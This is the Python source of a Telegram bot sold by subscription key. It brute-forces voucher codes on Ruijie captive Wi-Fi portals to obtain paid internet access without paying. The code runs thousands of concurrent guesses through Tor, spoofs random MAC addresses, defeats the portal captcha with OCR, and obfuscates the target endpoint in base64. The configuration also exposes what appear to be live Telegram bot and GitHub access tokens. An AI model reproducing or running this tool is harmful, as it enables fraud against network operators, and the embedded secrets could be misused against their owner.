import telebot, asyncio, aiohttp, json, base64, random, re, os
import string, time, uuid, subprocess, socket
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
from aiohttp_socks import ProxyConnector
import cv2, ddddocr, numpy as np
from datetime import datetime, timedelta, timezone

# ══════════════════════════════════════════════════════
#  CONFIG — ဒီနေရာတွင်သာ ပြောင်းရမည်
# ══════════════════════════════════════════════════════
BOT_TOKEN    = "8531489996:AAHZAhtnDbYNGtQoWiXf9lSW6nn_DHyOvvM"
ADMIN_ID     = "7592705124"          # သင်၏ Telegram User ID
GITHUB_TOKEN = "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"
REPO_OWNER   = "zarni1mobile122005-sudo"
REPO_NAME    = "ID-Bot"
WEB_PORT     = 8099                  # UptimeRobot ping port
TOR_PORT     = 9150
CONCURRENCY  = 2000                  # concurrent voucher checks
BATCH_SIZE   = 2000

# ══════════════════════════════════════════════════════
#  GLOBAL STATE
# ══════════════════════════════════════════════════════
bot               = AsyncTeleBot(BOT_TOKEN)
user_data         = {}   # {chat_id: {"session_url": ..., ...}}
approve           = {}   # {chat_id: True/False}
scan_tasks        = {}
success_messages  = {}
success_texts     = {}
limited_messages  = {}
limited_texts     = {}
retry_counts      = {}
captcha_state     = {}
_session_id_fail_count = {}
SUCCESS_CODE      = asyncio.Queue()
session           = None   # aiohttp session for GitHub/Telegram
_connector        = None   # Tor proxy connector
_tor_process      = None
_voucher_sem      = None
_start_time       = time.monotonic()
_ocr              = ddddocr.DdddOcr(show_ad=False)

# ══════════════════════════════════════════════════════
#  GITHUB DATA LAYER
# ══════════════════════════════════════════════════════
async def gh_get(path):
    """GitHub မှ JSON ဖိုင်ဖတ်သည်"""
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    try:
        async with session.get(url, headers=headers) as r:
            if r.status == 200:
                data = await r.json()
                content = base64.b64decode(data["content"]).decode("utf-8")
                return json.loads(content), data["sha"]
            if r.status == 404:
                return {}, None
    except Exception as e:
        print(f"[gh_get:{path}] {e}")
    return {}, None

async def gh_put(path, content, sha, message="update"):
    """GitHub တွင် JSON ဖိုင်သိမ်းသည်"""
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Content-Type": "application/json"}
    encoded = base64.b64encode(json.dumps(content, ensure_ascii=False, indent=2).encode()).decode()
    body = {"message": message, "content": encoded}
    if sha:
        body["sha"] = sha
    try:
        async with session.put(url, headers=headers, json=body) as r:
            return r.status in (200, 201)
    except Exception as e:
        print(f"[gh_put:{path}] {e}")
    return False

# ══════════════════════════════════════════════════════
#  AUTH & KEY SYSTEM
# ══════════════════════════════════════════════════════
PLANS = {
    "30m": timedelta(minutes=30),
    "1h":  timedelta(hours=1),
    "1d":  timedelta(days=1),
    "7d":  timedelta(days=7),
    "1m":  timedelta(days=30),
    "1y":  timedelta(days=365),
    "unlimited": None,
}

def make_expiry(plan: str) -> str | None:
    if plan not in PLANS:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (datetime.now(timezone.utc) + PLANS[plan]).isoformat()

def is_expired(record) -> bool:
    """False = still valid"""
    try:
        if isinstance(record, dict):
            exp = record.get("expires_at", "")
        else:
            exp = str(record)
        if exp == "9999-12-31T23:59:59Z":
            return False
        exp_dt = datetime.fromisoformat(exp.replace("Z", "+00:00"))
        return datetime.now(timezone.utc) >= exp_dt
    except:
        return True

def is_admin(chat_id) -> bool:
    return str(chat_id) == ADMIN_ID

async def is_reseller(chat_id) -> tuple[bool, dict]:
    """Reseller ဟုတ်မဟုတ်နှင့် data ပြန်ပေးသည်"""
    resellers, _ = await gh_get("resellers.json")
    data = resellers.get(str(chat_id))
    if data and data.get("balance", 0) > 0:
        return True, data
    return False, {}

def fmt_expiry(record) -> str:
    try:
        if isinstance(record, dict):
            exp = record.get("expires_at", "")
        else:
            exp = str(record)
        if exp == "9999-12-31T23:59:59Z":
            return "Unlimited"
        exp_dt = datetime.fromisoformat(exp.replace("Z", "+00:00"))
        now = datetime.now(timezone.utc)
        if exp_dt < now:
            return "Expired"
        diff = exp_dt - now
        d, h = diff.days, diff.seconds // 3600
        m = (diff.seconds % 3600) // 60
        return f"{d}d {h}h {m}m left"
    except:
        return "Unknown"

# ══════════════════════════════════════════════════════
#  TOR PROXY
# ══════════════════════════════════════════════════════
async def start_tor():
    global _tor_process
    try:
        subprocess.run(["pkill", "-f", "tor -f /tmp/torrc_bot"], capture_output=True)
        await asyncio.sleep(1)
        os.makedirs("/tmp/tor_data_bot", exist_ok=True)
        torrc = "/tmp/torrc_bot"
        with open(torrc, "w") as f:
            f.write("SocksPort 9150\nSocksPolicy accept *\nLog notice stderr\nDataDirectory /tmp/tor_data_bot\n")
        _tor_process = subprocess.Popen(["tor", "-f", torrc], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("Tor starting...")
        for i in range(40):
            await asyncio.sleep(2)
            try:
                s = socket.socket()
                s.settimeout(1)
                s.connect(("127.0.0.1", TOR_PORT))
                s.close()
                print(f"✅ Tor ready on port {TOR_PORT} ({(i+1)*2}s)")
                await asyncio.sleep(2)
                try:
                    tc = ProxyConnector.from_url(f"socks5://127.0.0.1:{TOR_PORT}", ssl=False)
                    async with aiohttp.ClientSession(connector=tc, timeout=aiohttp.ClientTimeout(total=15)) as ts:
                        async with ts.get("https://api.ipify.org?format=json") as r:
                            ip = (await r.json()).get("ip")
                            print(f"🧅 Tor exit IP: {ip}")
                    return True
                except Exception as e:
                    print(f"Tor IP check error: {e}")
                    return True
            except (ConnectionRefusedError, OSError):
                pass
        print("⚠️ Tor timeout — direct connection mode")
        return False
    except FileNotFoundError:
        print("⚠️ Tor not installed — direct connection mode")
        print("   Install: sudo apt install tor -y")
        return False
    except Exception as e:
        print(f"Tor error: {e}")
        return False

def make_connector():
    try:
        s = socket.socket()
        s.settimeout(1)
        s.connect(("127.0.0.1", TOR_PORT))
        s.close()
        return ProxyConnector.from_url(f"socks5://127.0.0.1:{TOR_PORT}", limit=5000, ssl=False)
    except:
        return aiohttp.TCPConnector(limit=5000, ttl_dns_cache=300, ssl=False)

# ══════════════════════════════════════════════════════
#  WEB SERVER (UptimeRobot ping)
# ══════════════════════════════════════════════════════
_web_start = time.time()

async def _ping_handler(request):
    up = int(time.time() - _web_start)
    h, r = divmod(up, 3600)
    m, s = divmod(r, 60)
    return web.json_response({
        "status": "ok",
        "bot": "WiFi Voucher Bot",
        "uptime": f"{h}h {m}m {s}s"
    })

async def web_server():
    app = web.Application()
    app.router.add_get("/", _ping_handler)
    app.router.add_get("/ping", _ping_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", WEB_PORT))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    print(f"🌐 Web server on port {port} — UptimeRobot URL: http://YOUR_VPS_IP:{port}/ping")

# ══════════════════════════════════════════════════════
#  PORTAL HELPERS
# ══════════════════════════════════════════════════════
def get_mac():
    b = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [b] + [random.randint(0, 255) for _ in range(5)]
    return ":".join(f"{x:02x}" for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r"(?<=mac=)[^&]+", new_mac, url)

async def check_portal_reachable(session_url):
    """Portal server ကိုရောက်မရောက် စစ်သည်: True / 'expired' / False"""
    try:
        s = socket.socket(); s.settimeout(1)
        s.connect(("127.0.0.1", TOR_PORT)); s.close()
        conn = ProxyConnector.from_url(f"socks5://127.0.0.1:{TOR_PORT}", ssl=False)
    except:
        conn = aiohttp.TCPConnector(ssl=False)
    hdrs = {
        "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        "accept": "text/html,*/*",
    }
    try:
        async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=25)) as ts:
            async with ts.get(session_url, allow_redirects=True, headers=hdrs) as r:
                final = str(r.url)
                body = ""
                try: body = await r.text()
                except: pass
                print(f"[portal_check] status={r.status} url={final[:100]}")
                if re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", final):
                    return True, None
                if r.status in (200, 301, 302, 403, 404):
                    if "ruijienetworks.com" in final:
                        if "error" in final or "Failed to find" in body or "Failed+to+find" in final:
                            return "expired", None
                        return True, None
                    return True, None
                return False, None
    except Exception as e:
        print(f"[portal_check] {type(e).__name__}: {e}")
        return False, None

async def check_session_url(session_url):
    """URL ပုံစံ စစ်ဆေးသည်"""
    if re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", session_url):
        return True
    ruijie = ["ruijienetworks.com", "portal-as.ruijienetworks.com"]
    params = ["mac=", "gw_id=", "stage=portal"]
    if any(d in session_url for d in ruijie) and any(p in session_url for p in params):
        return True
    return False

async def get_session_id(sess, session_url, prev_sid=None, chat_id=None):
    mac = get_mac()
    url_mac = replace_mac(session_url, mac)
    hdrs = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0",
        "upgrade-insecure-requests": "1",
    }
    try:
        async with sess.get(url_mac, headers=hdrs, allow_redirects=True) as r:
            final = str(r.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", final)
            if sid:
                _session_id_fail_count.pop(chat_id, None)
                return sid.group(1)
            try:
                body = await r.text()
                sid2 = re.search(r'"sessionId"\s*:\s*"([a-zA-Z0-9]+)"', body)
                if sid2:
                    return sid2.group(1)
            except: pass
            return prev_sid
    except Exception as e:
        print(f"[get_session_id] {e}")
        if chat_id:
            _session_id_fail_count[chat_id] = _session_id_fail_count.get(chat_id, 0) + 1
        return prev_sid

# ══════════════════════════════════════════════════════
#  CAPTCHA
# ══════════════════════════════════════════════════════
def _ocr_sync(img_bytes):
    try:
        arr = np.frombuffer(img_bytes, np.uint8)
        img = cv2.imdecode(arr, cv2.IMREAD_COLOR)
        if img is None: return None
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blur = cv2.GaussianBlur(gray, (3, 3), 0)
        _, thr = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buf = cv2.imencode(".png", thr)
        return _ocr.classification(buf.tobytes()).upper()
    except Exception as e:
        print(f"[OCR] {e}"); return None

async def captcha_text(img_bytes):
    return await asyncio.to_thread(_ocr_sync, img_bytes)

async def captcha_image(sess, session_id):
    hdrs = {
        "accept": "image/*,*/*;q=0.8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    }
    async with sess.get(
        "https://portal-as.ruijienetworks.com/api/auth/captcha/image",
        params={"sessionId": session_id, "_t": str(time.time())},
        headers=hdrs
    ) as r:
        return await r.read()

async def verify_captcha(sess, session_id, text):
    hdrs = {
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    }
    try:
        async with sess.post(
            "https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
            headers=hdrs, json={"sessionId": session_id, "authCode": text}
        ) as r:
            d = await r.json()
            return d.get("success") or d.get("result") == "success"
    except: return False

# ══════════════════════════════════════════════════════
#  CODE CHECK & VOUCHER
# ══════════════════════════════════════════════════════
VOUCHER_URL = base64.b64decode(
    b"aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM="
).decode()

def minute_to_hour(m):
    if m == "Unknown": return "Unknown"
    try:
        m = int(m)
        h, mn = m // 60, m % 60
        if h and mn: return f"{h}h {mn}m"
        return f"{h}h" if h else f"{mn}m"
    except: return str(m)

async def code_expires_date(session_id):
    hdrs = {
        "accept": "application/json, */*; q=0.01",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    try:
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(), timeout=aiohttp.ClientTimeout(total=15)
        ) as s:
            async with s.get(
                f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}",
                headers=hdrs
            ) as r:
                d = await r.json()
                name = d.get("result", {}).get("profileName", "Unknown")
                mins = d.get("result", {}).get("totalMinutes", "Unknown")
                return f"📋 Plan: {name} | ⏳ Time: {minute_to_hour(mins)}"
    except: return "📋 Plan: Unknown | ⏳ Time: Unknown"

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _connector
    if not recheck:
        cur = scan_tasks.get(chat_id)
        if not cur or cur.get("scan_id") != scan_id: return

    for attempt in range(3):
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(), timeout=aiohttp.ClientTimeout(total=30)
        ) as task_sess:
            sid = await get_session_id(task_sess, session_url, None, chat_id=chat_id)
            if not sid: return

            auth_code = None
            for _ in range(8):
                try:
                    img = await captcha_image(task_sess, sid)
                    txt = await captcha_text(img)
                    if not txt: continue
                    if await verify_captcha(task_sess, sid, txt):
                        auth_code = txt; break
                except Exception as e:
                    print(f"[captcha] {e}")
            if not auth_code: return

            if not recheck:
                cur = scan_tasks.get(chat_id)
                if not cur or cur.get("scan_id") != scan_id or cur.get("stop"): return

            post_data = {"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": auth_code}
            hdrs = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={sid}",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            response = None
            try:
                async with task_sess.post(VOUCHER_URL, json=post_data, headers=hdrs) as r:
                    response = await r.text()
                    print(f"[voucher] code={code} attempt={attempt+1} resp={response[:80]}")
            except Exception as e:
                print(f"[perform_check] {e}"); return

        if response and "request limited" in response:
            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
            await asyncio.sleep(1); continue
        break

    if not response: return

    if "logonUrl" in response:
        if recheck: return code
        if chat_id not in success_texts: success_texts[chat_id] = []
        exp = await code_expires_date(sid)
        success_texts[chat_id].append(f"🎫 {code}\n   {exp}")
        line = "\n\n".join(success_texts[chat_id])
        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
        if message:
            try:
                if chat_id not in success_messages:
                    sent = await bot.send_message(chat_id, f"🎉 Success Codes:\n\n{line}")
                    success_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(chat_id=chat_id, message_id=success_messages[chat_id], text=f"🎉 Success Codes:\n\n{line}")
                    except:
                        sent = await bot.send_message(chat_id, f"🎉 Success Codes:\n\n{line}")
                        success_messages[chat_id] = sent.message_id
            except Exception as e: print(f"[success_msg] {e}")

    elif "STA" in response:
        if chat_id not in limited_texts: limited_texts[chat_id] = []
        exp = await code_expires_date(sid)
        limited_texts[chat_id].append(f"⚠️ {code}\n   {exp}")
        line = "\n\n".join(limited_texts[chat_id])
        if message:
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id, f"⚠️ Limited Codes:\n\n{line}")
                    limited_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(chat_id=chat_id, message_id=limited_messages[chat_id], text=f"⚠️ Limited Codes:\n\n{line}")
                    except:
                        sent = await bot.send_message(chat_id, f"⚠️ Limited Codes:\n\n{line}")
                        limited_messages[chat_id] = sent.message_id
            except Exception as e: print(f"[limited_msg] {e}")

# ══════════════════════════════════════════════════════
#  SCAN ENGINE
# ══════════════════════════════════════════════════════
def digit_gen(n): return "".join(random.choice(string.digits) for _ in range(n))
def ascii_gen(): return "".join(random.choice(string.ascii_lowercase) for _ in range(6))
def all_gen(): return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(6))

def iter_codes(mode):
    if mode in ("6", "7"):
        codes = [str(i).zfill(int(mode)) for i in range(10 ** int(mode))]
        random.shuffle(codes); yield from codes
    elif mode == "8":
        while True: yield digit_gen(8)
    elif mode == "ascii-lower":
        while True: yield ascii_gen()
    elif mode == "all":
        while True: yield all_gen()
    else:
        raise ValueError(f"Mode မမှန်: {mode}  (6/7/8/ascii-lower/all)")

def fmt_progress(checked, total=None, speed=0, found=0, retries=0):
    sp = f"{speed:,.0f} codes/min"
    if total:
        pct = (checked/total)*100 if total else 0
        bar = "█"*min(20, int(pct/5)) + "░"*(20-min(20, int(pct/5)))
        return (f"🔍 Scanning...\n\n"
                f"📦 Checked : {checked:,}/{total:,}\n"
                f"📊 Progress: {pct:.2f}%\n"
                f"⚡ Speed   : {sp}\n"
                f"✅ Found   : {found}\n"
                f"🔁 Retry   : {retries}\n[{bar}]")
    return (f"🔍 Scanning...\n\n"
            f"📦 Checked : {checked:,}\n"
            f"⚡ Speed   : {sp}\n"
            f"✅ Found   : {found}\n"
            f"🔁 Retry   : {retries}")

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        scan_tasks.pop(chat_id, None); return

    total = 10**int(mode) if mode in ("6","7") else None
    checked = 0
    scan_start = time.monotonic()
    last_key_check = time.monotonic()

    await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text="🔌 Portal ချိတ်ဆက်မှု စစ်ဆေးနေပါသည်...")
    reachable, _ = await check_portal_reachable(session_url)
    if reachable == "expired":
        await bot.edit_message_text(
            chat_id=chat_id, message_id=progress_msg.message_id,
            text=("⚠️ Session URL ကုန်သွားပြီ!\n\n"
                  "Portal server ကိုရောက်သည် ✅\n"
                  "ဤ URL သက်တမ်းကုန်ပြီ\n\n"
                  "💡 WiFi ပြန်ချိတ်ပြီး URL အသစ်ရပြီး paste လုပ်ပါ"))
        scan_tasks.pop(chat_id, None); return
    if not reachable:
        await bot.edit_message_text(
            chat_id=chat_id, message_id=progress_msg.message_id,
            text=("❌ Portal ကိုချိတ်မဆက်နိုင်!\n\n"
                  "Portal server down ဖြစ်နေနိုင်သည်\n"
                  "URL ပြန်စစ်ဆေးပြီး /input ဖြင့် ပြန်ထည့်ပါ"))
        scan_tasks.pop(chat_id, None); return

    try:
        while True:
            cur = scan_tasks.get(chat_id)
            if not cur or cur.get("scan_id") != scan_id: return
            if cur.get("stop"): scan_tasks.pop(chat_id, None); return

            batch = []
            for _ in range(BATCH_SIZE):
                try: batch.append(next(code_iter))
                except StopIteration: break
            if not batch: break

            if time.monotonic() - last_key_check >= 600:
                auth, _ = await gh_get("auth_list.json")
                rec = auth.get(str(chat_id))
                if not rec or is_expired(rec):
                    approve[chat_id] = False
                    await bot.send_message(chat_id, "⚠️ Key သက်တမ်းကုန်ပြီ — Scan ရပ်သွားပြီ")
                    scan_tasks.pop(chat_id, None); return
                last_key_check = time.monotonic()

            async def _chk(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)

            await asyncio.gather(*[_chk(c) for c in batch], return_exceptions=True)
            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            found = len(success_texts.get(chat_id, []))
            retries = retry_counts.get(chat_id, 0)
            txt = fmt_progress(checked, total, speed, found, retries)
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=txt)
            except:
                try:
                    nm = await bot.send_message(chat_id, txt)
                    progress_msg.message_id = nm.message_id
                except: pass

        fin_found = len(success_texts.get(chat_id, []))
        await bot.edit_message_text(
            chat_id=chat_id, message_id=progress_msg.message_id,
            text=(f"✅ Scanning Completed!\n\n"
                  f"📦 Checked : {checked:,}\n"
                  f"✅ Found   : {fin_found}\n"
                  f"📊 Progress: 100%\n[████████████████████]"))
    finally:
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)

# ══════════════════════════════════════════════════════
#  GITHUB RESULT SCHEDULER
# ══════════════════════════════════════════════════════
async def github_scheduler():
    global SUCCESS_CODE
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await gh_get("result.json")
                if sha is None: results = {}
                for it in items:
                    cid = str(it["chat_id"])
                    if cid not in results: results[cid] = []
                    if it["code"] not in results[cid]:
                        results[cid].append(it["code"])
                await gh_put("result.json", results, sha, "Periodic update")
            except Exception as e: print(f"[scheduler] {e}")

# ══════════════════════════════════════════════════════
#  URL PROCESSOR (shared by /input & plain-text)
# ══════════════════════════════════════════════════════
async def process_url(message, url: str):
    chat_id = message.chat.id
    url = url.strip()
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "❌ ဦးစွာ /key နှိပ်ပါ")
        return
    if chat_id not in user_data: user_data[chat_id] = {}
    if "ruijienetworks.com" not in url and not ("portal" in url.lower() and "mac=" in url.lower()):
        await bot.reply_to(message, "❌ Ruijie portal URL မဟုတ်ပါ\n\nURL ပုံစံ: https://portal-as.ruijienetworks.com/api/auth/wifidog?...")
        return
    wm = await bot.reply_to(message, "⏳ URL စစ်ဆေးနေပါသည်...")
    if await check_session_url(url):
        user_data[chat_id]["session_url"] = url
        try:
            await bot.edit_message_text(
                chat_id=chat_id, message_id=wm.message_id,
                text=("✅ Session URL သိမ်းဆည်းပြီး!\n\n"
                      "━━━━━━━━━━━━━━━━\n"
                      "🔍 Scan မုဒ်ရွေးပါ:\n"
                      "━━━━━━━━━━━━━━━━\n\n"
                      "/scan 6        — 6 digit (000000~999999)\n"
                      "/scan 7        — 7 digit\n"
                      "/scan 8        — 8 digit random\n"
                      "/scan ascii-lower — lowercase\n"
                      "/scan all      — letters+digits\n\n"
                      "💡 မသိလျှင် /scan 6 သုံးပါ"))
        except: pass
    else:
        try:
            await bot.edit_message_text(
                chat_id=chat_id, message_id=wm.message_id,
                text=("❌ URL မမှန်ကန် / ကုန်သွားပြီ!\n\n"
                      "💡 WiFi ပြန်ချိတ်ပြီး portal URL အသစ်ရပါ"))
        except: pass

# ══════════════════════════════════════════════════════
#  BOT HANDLERS — USER COMMANDS
# ══════════════════════════════════════════════════════
@bot.message_handler(commands=["start"])
async def cmd_start(message):
    chat_id = message.chat.id
    ok = approve.get(chat_id, False)
    has_url = chat_id in user_data and "session_url" in user_data.get(chat_id, {})
    if not ok:
        step = "① /key — Access စစ်ဆေးပါ\n② Portal URL ကို paste လုပ်ပါ\n③ /scan 6 — Scan စတင်ပါ\n\n⚠️ ဦးစွာ /key နှိပ်ပါ"
    elif not has_url:
        step = "✅ Key OK!\n\nWiFi portal မှ URL ကို ဒီနေရာ paste လုပ်ပါ\n\n📌 https://portal-as.ruijienetworks.com/api/auth/wifidog?..."
    else:
        step = "✅ အသင့်ဖြစ်ပြီ!\n\n/scan 6 — စတင်\n/stop — ရပ်\n/result — ရလဒ်"
    await bot.reply_to(message,
        f"👋 WiFi Voucher Scanner Bot\n\n"
        f"━━━━━━━━━━━━━━━━\n{step}\n━━━━━━━━━━━━━━━━\n\n"
        "Commands: /key · /input · /scan · /stop · /result · /recheck")

@bot.message_handler(commands=["key"])
async def cmd_key(message):
    auth, _ = await gh_get("auth_list.json")
    uid = str(message.chat.id)
    rec = auth.get(uid)
    if rec and not is_expired(rec):
        approve[message.chat.id] = True
        user_data.setdefault(message.chat.id, {})
        await bot.reply_to(message,
            f"✅ Key မှန်ကန်ပါသည်\n"
            f"📅 Expires: {fmt_expiry(rec)}\n\n"
            "WiFi portal URL ကို paste လုပ်ပြီး /scan 6 နှိပ်ပါ")
    elif rec:
        approve[message.chat.id] = False
        await bot.reply_to(message, "❌ Key Expired ဖြစ်နေပါသည်\nAdmin ကိုဆက်သွယ်ပြီး renew လုပ်ပါ")
    else:
        await bot.reply_to(message, "❌ Key မရှိသေးပါ\nAdmin ထံမှ key ရယူပါ")

@bot.message_handler(commands=["input"])
async def cmd_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "📌 Usage:\n/input https://portal-as.ruijienetworks.com/api/auth/wifidog?...\n\n💡 သို့မဟုတ် URL တိုက်ရိုက် paste လုပ်လည်း ရသည်")
        return
    await process_url(message, args[1])

@bot.message_handler(commands=["scan"])
async def cmd_scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /scan <6|7|8|ascii-lower|all>"); return
    mode = args[1].strip()
    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "❌ /key ကိုအရင်ပြုလုပ်ပါ"); return
    if chat_id not in user_data or "session_url" not in user_data.get(chat_id, {}):
        await bot.reply_to(message, "❌ Portal URL မထည့်ရသေး — URL ကို paste လုပ်ပါ"); return
    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "⚠️ Scan လုပ်နေပြီ — /stop နှိပ်ပြီးမှ ပြန်လုပ်ပါ"); return
    pm = await bot.send_message(chat_id, "🔍 Scan စတင်နေပါသည်...")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]["session_url"], scan_id, message=message, progress_msg=pm))
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

@bot.message_handler(commands=["stop"])
async def cmd_stop(message):
    chat_id = message.chat.id
    d = scan_tasks.get(chat_id)
    if d and not d["task"].done():
        d["stop"] = True; d["scan_id"] = None; d["task"].cancel()
        success_messages.pop(chat_id, None); success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None); limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        await bot.reply_to(message, "⛔ Scan ရပ်တန့်ပြီးပါပြီ")
    else:
        await bot.reply_to(message, "ℹ️ Scan မရှိပါ")

@bot.message_handler(commands=["result"])
async def cmd_result(message):
    auth, _ = await gh_get("auth_list.json")
    uid = str(message.chat.id)
    if uid not in auth:
        await bot.reply_to(message, "❌ Key မရှိသေးပါ"); return
    results, _ = await gh_get("result.json")
    codes = results.get(uid)
    if codes:
        await bot.reply_to(message, f"✅ Found Codes ({len(codes)}):\n\n" + "\n".join(codes))
    else:
        await bot.reply_to(message, "📭 ရလဒ်မရှိသေးပါ")

@bot.message_handler(commands=["recheck"])
async def cmd_recheck(message):
    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "❌ /key ကိုအရင်ပြုလုပ်ပါ"); return
    if chat_id not in user_data or "session_url" not in user_data.get(chat_id, {}):
        await bot.reply_to(message, "❌ URL မရှိသေး — URL ကို paste လုပ်ပြီးမှ recheck ပြုလုပ်ပါ"); return
    results, sha = await gh_get("result.json")
    uid = str(chat_id)
    codes = results.get(uid, [])
    if not codes:
        await bot.reply_to(message, "📭 Recheck လုပ်ရန် code မရှိသေးပါ"); return
    await bot.reply_to(message, f"🔄 {len(codes)} codes စစ်ဆေးနေပါသည်...")
    session_url = user_data[chat_id]["session_url"]
    valid = []
    for code in codes:
        r = await perform_check(session_url, code, chat_id, recheck=True, message=message)
        if r: valid.append(r)
    txt = "\n".join(valid) if valid else "မည်သည့် active code မျှမတွေ့ပါ"
    await bot.reply_to(message, f"✅ Rechecked:\n\n{txt}")
    results[uid] = valid
    await gh_put("result.json", results, sha, f"Recheck for {uid}")

# ══════════════════════════════════════════════════════
#  BOT HANDLERS — ADMIN COMMANDS
# ══════════════════════════════════════════════════════
@bot.message_handler(commands=["status"])
async def cmd_status(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission"); return
    active = sum(1 for d in scan_tasks.values() if not d["task"].done())
    up = int(time.monotonic() - _start_time)
    h, r = divmod(up, 3600); m, s = divmod(r, 60)
    auth, _ = await gh_get("auth_list.json")
    resellers, _ = await gh_get("resellers.json")
    await bot.reply_to(message,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime     : {h}h {m}m {s}s\n"
        f"🔍 Scans      : {active} active\n"
        f"✅ Users      : {len(auth)}\n"
        f"👥 Resellers  : {len(resellers)}\n"
        f"💾 RAM Users  : {len(user_data)}")

@bot.message_handler(commands=["genkey"])
async def cmd_genkey(message):
    chat_id = message.chat.id
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, "Usage:\n/genkey <plan> <user_id>\n\nPlans: 30m/1h/1d/7d/1m/1y/unlimited"); return

    plan, uid = args[1], args[2]
    exp = make_expiry(plan)
    if not exp:
        await bot.reply_to(message, "❌ Plan မမှန်ပါ — 30m/1h/1d/7d/1m/1y/unlimited"); return

    if is_admin(chat_id):
        auth, sha = await gh_get("auth_list.json")
        auth[uid] = {"expires_at": exp, "plan": plan, "by": "admin"}
        await gh_put("auth_list.json", auth, sha, f"genkey {uid}")
